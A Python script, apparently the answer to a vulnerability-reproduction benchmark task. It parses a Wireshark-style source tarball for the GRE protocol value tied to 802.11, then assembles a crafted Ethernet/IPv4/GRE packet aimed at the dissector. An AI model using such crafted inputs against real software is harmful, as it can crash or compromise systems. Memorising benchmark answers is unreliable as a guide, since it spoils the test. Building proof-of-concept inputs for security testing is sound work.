import tarfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        etypes_map = {}
        gre_proto = 0x2988  # Default fallback (ETHERTYPE_IEEE_802_11)

        try:
            with tarfile.open(src_path, 'r') as tar:
                etypes_file = None
                ieee80211_file = None
                
                # Locate necessary files
                for m in tar.getmembers():
                    if m.name.endswith('etypes.h'):
                        etypes_file = m
                    elif m.name.endswith('packet-ieee80211.c'):
                        ieee80211_file = m
                
                # Parse etypes definitions
                if etypes_file:
                    f = tar.extractfile(etypes_file)
                    content = f.read().decode('utf-8', errors='ignore')
                    for match in re.finditer(r'#define\s+(ETHERTYPE_[A-Z0-9_]+)\s+(0x[0-9a-fA-F]+)', content):
                        etypes_map[match.group(1)] = int(match.group(2), 16)
                
                # Find the GRE protocol registration for 802.11
                if ieee80211_file:
                    f = tar.extractfile(ieee80211_file)
                    content = f.read().decode('utf-8', errors='ignore')
                    # Look for dissector_add_uint("gre.proto", VALUE, ...)
                    match = re.search(r'dissector_add_uint\s*\(\s*"gre.proto"\s*,\s*([A-Za-z0-9_]+)', content)
                    if match:
                        val = match.group(1)
                        if val.startswith('0x'):
                            gre_proto = int(val, 16)
                        elif val.isdigit():
                            gre_proto = int(val)
                        elif val in etypes_map:
                            gre_proto = etypes_map[val]
        except Exception:
            pass

        # Construct Packet
        # Ethernet Header (14 bytes): Dest, Src, Type=IPv4
        eth = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00'
        
        # IP Header (20 bytes)
        # Total Length = 20 (IP) + 4 (GRE) + 7 (Payload) = 31
        # Protocol = 47 (GRE)
        ip_tmpl = b'\x45\x00\x00\x1f\x00\x01\x00\x00\x40\x2f\x00\x00\x7f\x00\x00\x01\x7f\x00\x00\x01'
        
        # Calculate IP Checksum
        s = 0
        for i in range(0, len(ip_tmpl), 2):
            w = (ip_tmpl[i] << 8) + ip_tmpl[i+1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        chk = ~s & 0xffff
        
        ip = ip_tmpl[:10] + struct.pack('>H', chk) + ip_tmpl[12:]
        
        # GRE Header (4 bytes)
        # Flags=0, Proto=gre_proto
        gre = b'\x00\x00' + struct.pack('>H', gre_proto)
        
        # Payload (7 bytes) - minimal payload to complete the packet
        payload = b'\x00' * 7
        
        return eth + ip + gre + payload